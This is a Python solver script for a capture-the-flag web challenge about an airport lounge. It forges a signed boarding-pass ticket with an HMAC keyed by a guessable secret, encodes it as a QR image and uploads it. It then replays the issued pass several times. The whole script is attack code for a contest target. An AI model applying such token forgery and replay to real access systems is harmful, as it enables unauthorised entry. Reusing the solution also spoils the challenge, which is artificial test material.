import hashlib
import hmac
from io import BytesIO

import qrcode
import requests

URL = "https://nns-international-lounge-cc6a5f963fa8.chall.nnsc.tf"
NAME = "solver1788654594"
PASSWORD = "correcthorsebatterystaple"
FIELDS = [
    "LS", "060926", "0609260029", "0609270029", "8113828958702446", "NNS",
    "201", f"{NAME} test",
]
SECRET = hashlib.sha256(b"lounge").digest()


def signed_ticket(remaining):
    fields = FIELDS + [str(remaining)]
    return "/".join(fields + [hmac.new(SECRET, "/".join(fields).encode(), hashlib.sha256).hexdigest()[:6]])


def post_ticket(session, payload):
    image = BytesIO()
    qrcode.make(payload).save(image, format="PNG")
    image.seek(0)
    response = session.post(URL + "/lounge", files={"ticket": ("pass.png", image, "image/png")}, timeout=30)
    print(response.status_code, response.url)
    print(response.text)


if __name__ == "__main__":
    session = requests.Session()
    response = session.post(URL + "/login", data={
        "first_name": NAME,
        "last_name": "test",
        "password": PASSWORD,
    }, timeout=30)
    response.raise_for_status()
    post_ticket(session, signed_ticket(5))
    for _ in range(4):
        current_pass = session.get(URL + "/pass.png", timeout=30)
        current_pass.raise_for_status()
        response = session.post(URL + "/lounge", files={
            "ticket": ("pass.png", current_pass.content, "image/png")
        }, timeout=30)
        print(response.status_code, response.url)
        print(response.text)
